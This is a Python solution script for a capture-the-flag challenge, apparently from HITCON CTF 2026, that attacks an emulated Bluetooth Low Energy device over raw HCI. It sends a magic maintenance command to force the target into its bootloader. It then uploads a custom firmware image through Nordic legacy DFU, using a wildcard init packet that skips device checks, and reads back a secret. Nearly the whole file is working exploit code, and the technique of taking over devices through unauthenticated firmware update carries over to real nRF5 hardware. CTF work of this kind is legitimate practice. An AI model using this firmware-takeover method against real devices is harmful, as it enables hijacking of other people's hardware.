#!/usr/bin/env python3
"""HITCON CTF 2026 Yaju OS BLE/HCI exploit. Requires bumble==0.0.235.

The TCP server speaks raw Rootcanal HCI, NOT plaintext or GATT-over-TCP.
Preserve one TCP/HCI connection across both target firmware reboots.
"""
import argparse
import asyncio
import binascii
import logging
import re
import struct
import sys
from pathlib import Path

MAGIC = bytes.fromhex('11 45 14 19 19 81 00')
TARGET_ADDRESS = 'F6:F7:F8:F9:FA:FB'
MAINTENANCE_CONTROL = '5a1c0002-7c5d-4c8d-942c-a786c1d58b6d'
FLAG_CHARACTERISTIC = '66551235-3322-1100-f0ee-ccaa88664422'
IMAGE = Path(__file__).with_name('yaju_payload.bin')


def make_init(image: bytes) -> bytes:
    # nRF5 SDK legacy DFU init packet: device type/revision, app version,
    # SoftDevice requirements count and list, then firmware image CRC16/CCITT.
    # 0xffff skips device-type and revision check; 0xfffe is an SDK wildcard.
    crc = binascii.crc_hqx(image, 0xffff)
    return struct.pack('<HHIHHH', 0xffff, 0xffff, 0, 1, 0xfffe, crc)


async def discover(connection):
    client = connection.gatt_client
    await client.discover_services()
    found = []
    for service in client.services:
        await service.discover_characteristics()
        for ch in service.characteristics:
            found.append(ch)
    print('[+] GATT:', ', '.join(f'{ch.uuid}[{int(ch.properties):#x}]' for ch in found), flush=True)
    return found


def find_char(chs, uuid):
    for ch in chs:
        if str(ch.uuid).lower() == uuid.lower():
            return ch
    return None


async def connect_with_retry(device, phase, attempts=35):
    from bumble.hci import Address
    for n in range(1, attempts + 1):
        try:
            # Address() uses RANDOM_DEVICE_ADDRESS by default (target is static random).
            connection = await asyncio.wait_for(
                device.connect(Address(TARGET_ADDRESS)), timeout=7.0
            )
            print(f'[+] Connected for {phase} on attempt {n}', flush=True)
            chars = await asyncio.wait_for(discover(connection), timeout=10.0)
            return connection, chars
        except Exception as error:
            if n == attempts:
                raise RuntimeError(f'cannot connect to {phase}: {error!r}') from error
            if n < 4 or n % 5 == 0:
                print(f'[*] {phase}: connect retry {n}: {type(error).__name__}: {error}', flush=True)
            await asyncio.sleep(0.5)


async def wait_disconnection(connection, event, phase):
    try:
        await asyncio.wait_for(event.wait(), timeout=18)
        print(f'[+] {phase}: remote controller disconnected for reset', flush=True)
    except asyncio.TimeoutError:
        print(f'[!] {phase}: no disconnect event (trying to continue)', flush=True)
        try:
            await asyncio.wait_for(connection.disconnect(), timeout=3)
        except Exception:
            pass
    await asyncio.sleep(0.8)


async def enter_bootloader(connection, chars):
    char = find_char(chars, MAINTENANCE_CONTROL)
    if char is None:
        raise RuntimeError('maintenance control not found in GATT list')
    print('[*] Writing obfuscated maintenance command:', MAGIC.hex(), flush=True)
    event = asyncio.Event()
    connection.on(connection.EVENT_DISCONNECTION, lambda *_: event.set())
    try:
        await asyncio.wait_for(char.write_value(MAGIC, with_response=True), timeout=10)
    except Exception as exc:
        print(f'[!] maintenance write interrupted by reset: {exc!r}', flush=True)
    await wait_disconnection(connection, event, 'maintenance')


async def do_dfu(connection, chars, image, speed):
    controls = [c for c in chars if int(c.properties) & 0x10 and int(c.properties) & 0x08]
    packets = [c for c in chars if int(c.properties) & 0x04 and not int(c.properties) & 0x10]
    if not controls or not packets:
        raise RuntimeError('legacy DFU control/packet characteristic pair not found')
    ctrl, packet = controls[0], packets[0]
    queue = asyncio.Queue()
    def notify(value):
        data = bytes(value)
        print(f'    <- notify {data.hex()}', flush=True)
        queue.put_nowait(data)
    await ctrl.subscribe(notify)
    print('[+] DFU notifications enabled', flush=True)

    async def command(data):
        print('    -> CTRL', data.hex(), flush=True)
        await asyncio.wait_for(ctrl.write_value(data, with_response=True), timeout=20)

    async def send_data(blob):
        for i in range(0, len(blob), 20):
            chunk = blob[i:i + 20]
            await packet.write_value(chunk, with_response=False)
            await asyncio.sleep(speed)

    async def response(opcode):
        while True:
            pkt = await asyncio.wait_for(queue.get(), timeout=30)
            if len(pkt) >= 3 and pkt[:2] == bytes((0x10, opcode)):
                if pkt[2] != 1:
                    raise RuntimeError(f'DFU opcode {opcode:02x} returned {pkt.hex()}')
                print(f'[+] DFU opcode {opcode:02x} OK', flush=True)
                return pkt
            print(f'[*] ignoring unrelated notification {pkt.hex()}', flush=True)

    init = make_init(image)
    print(f'[+] image: {len(image)} bytes, CRC16={binascii.crc_hqx(image, 0xffff):04x}, '
          f'init={init.hex()}', flush=True)

    # Nordic SDK <=11 Legacy DFU: start / size / init begin / init data /
    # init end / firmware receive / data / validate / activate+reset.
    await command(b'\x01\x04')
    await send_data(struct.pack('<III', 0, 0, len(image)))
    await response(0x01)

    await command(b'\x02\x00')
    await send_data(init)
    await command(b'\x02\x01')
    await response(0x02)

    await command(b'\x03')
    await send_data(image)
    await response(0x03)

    await command(b'\x04')
    await response(0x04)
    event = asyncio.Event()
    connection.on(connection.EVENT_DISCONNECTION, lambda *_: event.set())
    print('[*] Activating uploaded Thumb firmware...', flush=True)
    try:
        await command(b'\x05')
    except Exception as exc:
        print(f'[!] Activation write interrupted by reset: {exc!r}', flush=True)
    await wait_disconnection(connection, event, 'DFU')


async def get_flag(connection, chars):
    ch = find_char(chars, FLAG_CHARACTERISTIC)
    if ch is None:
        raise RuntimeError(f'exfil characteristic {FLAG_CHARACTERISTIC} not found')
    data = await asyncio.wait_for(ch.read_value(), timeout=25)
    data = bytes(data).rstrip(b'\x00')
    print('[+] GPIO secret:', repr(data), flush=True)
    matches = re.findall(rb'(?:hitcon|HITCON|CTF)\{[^\}\r\n]+\}', data)
    if matches:
        for flag in matches:
            print('FLAG:', flag.decode('utf-8', errors='replace'), flush=True)
    else:
        print('[!] No flag-formatted string, raw hex:', data.hex(), flush=True)
    return data


async def solve(host, port, stop_after, speed):
    from bumble.device import Device
    from bumble.hci import Address
    from bumble.transport import open_transport
    # The single player TCP connection owns its Rootcanal and emulated board.
    # Reopening TCP resets the entire challenge, so never close it between phases.
    transport_spec = f'tcp-client:{host}:{port}'
    print(f'[*] Connecting to HCI transport {transport_spec}', flush=True)
    async with await open_transport(transport_spec) as transport:
        device = Device.with_hci(
            'YajuCentral', Address('C5:C4:C3:C2:C1:C0'),
            transport.source, transport.sink,
        )
        await device.power_on()
        connection, chars = await connect_with_retry(device, 'maintenance')
        if find_char(chars, MAINTENANCE_CONTROL):
            await enter_bootloader(connection, chars)
            if stop_after == 'maintenance':
                return
            connection, chars = await connect_with_retry(device, 'bootloader')
        else:
            print('[*] Maintenance service absent; inspecting current firmware', flush=True)
        if find_char(chars, FLAG_CHARACTERISTIC):
            await get_flag(connection, chars)
            return
        image = IMAGE.read_bytes()
        if len(image) % 4 or len(image) > 0x10800:
            raise ValueError('DFU image needs 4-byte alignment and must fit the staging bank')
        await do_dfu(connection, chars, image, speed)
        if stop_after == 'bootloader':
            return
        connection, chars = await connect_with_retry(device, 'uploaded application')
        await get_flag(connection, chars)


def offline_check():
    image = IMAGE.read_bytes()
    sp, entry = struct.unpack_from('<II', image)
    assert sp == 0x20007f00 and entry == 0x1b009, (hex(sp), hex(entry))
    assert bytes.fromhex('63df') in image
    assert bytes.fromhex('a0df') in image
    assert bytes.fromhex('a2df') in image
    init = make_init(image)
    assert len(init) == 14
    print('OFFLINE_PASS: vector, SVC, init packet; image length', len(image),
          'CRC16', hex(struct.unpack_from('<H',init,12)[0]))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host', nargs='?', default='<host>')
    parser.add_argument('port', nargs='?', type=int, default=6402)
    parser.add_argument('--stop-after', choices=['maintenance','bootloader'])
    parser.add_argument('--speed', type=float, default=0.04,
                        help='seconds between 20-byte DFU packets')
    parser.add_argument('--offline-check', action='store_true')
    parser.add_argument('--verbose', action='store_true')
    args=parser.parse_args()
    if args.offline_check:
        offline_check();return
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    try:
        asyncio.run(solve(args.host, args.port, args.stop_after, args.speed))
    except KeyboardInterrupt:
        return
    except Exception:
        logging.exception('EXPLOIT FAILED')
        raise SystemExit(1)


if __name__=='__main__':
    main()
